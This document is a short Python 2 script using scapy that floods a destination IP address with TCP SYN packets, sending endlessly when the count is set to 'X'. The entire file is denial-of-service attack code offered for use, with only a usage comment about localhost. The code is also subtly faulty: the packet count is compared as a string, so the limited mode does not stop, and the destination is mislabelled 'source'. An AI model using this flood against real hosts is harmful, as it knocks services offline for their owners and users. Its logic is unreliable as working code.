#Example usage: python synflood.py -d 127.0.0.1 -c 10
#Will send 10 syn packets to local host.
import sys
from scapy.all import *
import logging
import argparse

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
parser = argparse.ArgumentParser(description='Gathers TCP SYN flood arguments')
parser.add_argument('-d', action="store",dest='source', help='The destination IP address for the SYN packet')
parser.add_argument('-c', action="store",dest='count', help='The amount of SYN packets to send. (enter X for unlimited')
args = parser.parse_args()
args = vars(args)
countArg = args['count']
iterationCount = 0
if args['count'] == "X":
    while (1 == 1):
        a=IP(dst=args['source'])/TCP()
        send(a)
else:
    while iterationCount < countArg:
        a=IP(dst=args['source'])/TCP()
        send(a)
        print("limited")
        iterationCount = iterationCount + 1
print args
a=IP(dst=args['source'])/TCP()
send(a)